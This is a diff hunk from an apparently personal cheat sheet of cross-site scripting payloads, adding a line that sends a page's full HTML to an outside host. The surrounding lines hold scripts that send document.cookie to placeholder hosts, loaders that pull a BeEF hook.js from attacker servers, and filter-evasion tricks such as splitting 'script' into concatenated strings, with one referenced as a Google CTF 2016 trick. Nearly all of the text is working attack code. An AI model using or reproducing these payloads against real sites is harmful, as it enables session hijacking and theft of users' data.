@@ -107,6 +107,7 @@ asp.net: the csrf protection is to actually include the session ID is in the Vie
 <script>document.location="http://x/?c="+document.cookie</script>
 <iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://x/?c="+document.cookie)></iframe>
 <script src=//b.e.uk.to/a.js></script>
+<script>window.location='http://b.e.uk.to/'+document.documentElement.innerHTML</script>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://6.6.6.6:3000/hook.js";document.body.appendChild(sc);'/>
 <iframe src=//b.e.uk.to /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
 <a href="javascript:location='http://x/'%2bdocument.cookie" onclick="">x</a> # google-ctf-2016 geokitties trick where waf triggered when there was any non-empty event handler
